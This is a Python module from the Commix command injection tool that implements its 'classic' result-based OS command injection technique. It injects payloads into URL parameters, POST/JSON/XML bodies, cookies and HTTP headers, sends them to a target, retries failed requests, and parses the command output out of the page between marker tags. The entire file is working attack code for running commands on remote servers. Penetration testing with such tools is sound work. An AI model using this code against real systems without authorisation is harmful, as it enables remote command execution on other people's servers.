#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import time
import json
import string
import random
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import html_parser as _html_parser
from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.core.injections.results_based.techniques.classic import cb_payloads
try:
  import html
  unescape = html.unescape
except:  # Python 2
  unescape = _html_parser.HTMLParser().unescape

"""
The "classic" technique on result-based OS command injection.
"""

"""
Check if target host is vulnerable.
"""
def injection_test(payload, http_request_method, url):

  # Check if defined POST data
  if not settings.USER_DEFINED_POST_DATA or settings.IGNORE_USER_DEFINED_POST_DATA:
    if settings.SINGLE_WHITESPACE in payload:
      payload = replace(settings.SINGLE_WHITESPACE, _urllib.parse.quote_plus(settings.SINGLE_WHITESPACE))
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
    if settings.USER_DEFINED_POST_DATA:
      request = _urllib.request.Request(target, settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC), method=http_request_method)
    else:
      request = _urllib.request.Request(target, method=http_request_method)

    # Check if defined extra headers.
    headers.do_check(request)

    # Get the response of the request.
    response = requests.get_request_response(request)

  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    #parameter = _urllib.parse.unquote(parameter)
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter, http_request_method)
    parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
    # Define the POST data
    if settings.IS_JSON:
      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
      try:
        data = checks.json_data(data)
      except ValueError:
        pass
    elif settings.IS_XML:
      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
    else:
      data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
    request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC), method=http_request_method)

    # Check if defined extra headers.
    headers.do_check(request)

    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)

    # Get the response of the request.
    response = requests.get_request_response(request)

  return response, vuln_parameter

"""
Evaluate test results.
"""
def injection_test_results(response, TAG, randvcalc):
  if type(response) is bool and response != True or response is None:
    return False
  else:
    # Check the execution results
    html_data = checks.page_encoding(response, action="decode")
    html_data = html_data.replace("\n",settings.SINGLE_WHITESPACE)
    # cleanup string / unescape html to string
    html_data = _urllib.parse.unquote(html_data)
    html_data = unescape(html_data)
    # Replace non-ASCII characters with a single space
    re.sub(r"[^\x00-\x7f]",r" ", html_data)

    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + TAG + TAG, html_data)
    else:
      shell = re.findall(r"" + TAG + str(randvcalc) + TAG  + TAG, html_data)
    if len(shell) > 1:
      shell = shell[0]
    return shell

"""
Check if target host is vulnerable. (Cookie-based injection)
"""
def cookie_injection_test(url, vuln_parameter, payload, http_request_method):
  return requests.cookie_injection(url, vuln_parameter, payload, http_request_method)

"""
Check if target host is vulnerable. (User-Agent-based injection)
"""
def user_agent_injection_test(url, vuln_parameter, payload, http_request_method):
  return requests.user_agent_injection(url, vuln_parameter, payload, http_request_method)

"""
Check if target host is vulnerable. (Referer-based injection)
"""
def referer_injection_test(url, vuln_parameter, payload, http_request_method):
  return requests.referer_injection(url, vuln_parameter, payload, http_request_method)

"""
Check if target host is vulnerable. (Host-based injection)
"""
def host_injection_test(url, vuln_parameter, payload, http_request_method):
  return requests.host_injection(url, vuln_parameter, payload, http_request_method)

"""
Check if target host is vulnerable. (Custom header injection)
"""
def custom_header_injection_test(url, vuln_parameter, payload, http_request_method):
  return requests.custom_header_injection(url, vuln_parameter, payload, http_request_method)

"""
The main command injection exploitation.
"""
def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):

  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
    if alter_shell:
      # Classic decision payload (check if host is vulnerable).
      payload = cb_payloads.cmd_execution_alter_shell(separator, TAG, cmd)
    else:
      # Classic decision payload (check if host is vulnerable).
      payload = cb_payloads.cmd_execution(separator, TAG, cmd)

    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    # Whitespace fixation
    payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)

    # Perform payload modification
    payload = checks.perform_payload_modification(payload)

    # Check if defined "--verbose" option.
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Executing the '" + cmd + "' command. "
      sys.stdout.write(settings.print_debug_msg(debug_msg))
      sys.stdout.flush()
      sys.stdout.write("\n" + settings.print_payload(payload) + "\n")

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      response = cookie_injection_test(url, vuln_parameter, payload, http_request_method)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      response = user_agent_injection_test(url, vuln_parameter, payload, http_request_method)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      response = referer_injection_test(url, vuln_parameter, payload, http_request_method)

    # Check if defined host with "INJECT_HERE" tag
    elif menu.options.host and settings.INJECT_TAG in menu.options.host:
      response = host_injection_test(url, vuln_parameter, payload, http_request_method)

    # Check if defined custom header with "INJECT_HERE" tag
    elif settings.CUSTOM_HEADER_INJECTION:
      response = custom_header_injection_test(url, vuln_parameter, payload, http_request_method)

    else:
      # Check if defined POST data
      if not settings.USER_DEFINED_POST_DATA or settings.IGNORE_USER_DEFINED_POST_DATA:

        # Check if its not specified the 'INJECT_HERE' tag
        #url = parameters.do_GET_check(url, http_request_method)
        target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        vuln_parameter = ''.join(vuln_parameter)
        if settings.USER_DEFINED_POST_DATA:
          request = _urllib.request.Request(target, settings.USER_DEFINED_POST_DATA.encode(settings.DEFAULT_CODEC), method=http_request_method)
        else:
          request = _urllib.request.Request(target, method=http_request_method)

        # Check if defined extra headers.
        headers.do_check(request)

        # Get the response of the request.
        response = requests.get_request_response(request)

      else :
        # Check if defined method is POST.
        parameter = menu.options.data
        #parameter = _urllib.parse.unquote(parameter)
        # Check if its not specified the 'INJECT_HERE' tag
        parameter = parameters.do_POST_check(parameter, http_request_method)
        parameter = ''.join(str(e) for e in parameter).replace("+","%2B")
        # Define the POST data
        if settings.IS_JSON:
          data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace("\"", "\\\"")))
          try:
            data = checks.json_data(data)
          except ValueError:
            pass
        elif settings.IS_XML:
          data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
        else:
          data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC), method=http_request_method)

        # Check if defined extra headers.
        headers.do_check(request)

        # Get the response of the request.
        response = requests.get_request_response(request)

    return response

  # Do the injection check
  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
  tries = 0
  while not response:
    if tries < (menu.options.failed_tries / 2):
      response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
      tries = tries + 1
    else:
      err_msg = "Something went wrong, the request has failed (" + str(tries) + ") times continuously."
      sys.stdout.write(settings.print_critical_msg(err_msg)+"\n")
      raise SystemExit()
  return response

"""
The command execution results.
"""
def injection_results(response, TAG, cmd):

  false_result = False
  try:
    # Grab execution results
    html_data = checks.page_encoding(response, action="decode")
    html_data = html_data.replace("\n",settings.SINGLE_WHITESPACE)
    # cleanup string / unescape html to string
    html_data = _urllib.parse.unquote(html_data)
    html_data = unescape(html_data)

    # Replace non-ASCII characters with a single space
    re.sub(r"[^\x00-\x7f]",r" ", html_data)

    for end_line in settings.END_LINE:
      if end_line in html_data:
        html_data = html_data.replace(end_line, settings.SINGLE_WHITESPACE)
        break

    shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + settings.SINGLE_WHITESPACE, html_data)
    if not shell:
      shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + "", html_data)
    if not shell:
      return shell
    try:
      if TAG in shell:
        shell = re.findall(r"" + "(.*)" + TAG + TAG, shell)
      # Clear junks
      shell = [tags.replace(TAG + TAG , settings.SINGLE_WHITESPACE) for tags in shell]
      shell = [backslash.replace("\/","/") for backslash in shell]
    except UnicodeDecodeError:
      pass
    if settings.TARGET_OS == settings.OS.WINDOWS:
      if menu.options.alter_shell:
        shell = [right_space.rstrip() for right_space in shell]
        shell = [left_space.lstrip() for left_space in shell]
        if "<<<<" in shell[0]:
          false_result = True
      else:
        if shell[0] == "%i" :
          false_result = True

  except AttributeError:
    false_result = True

  if false_result:
    shell = ""

  return shell
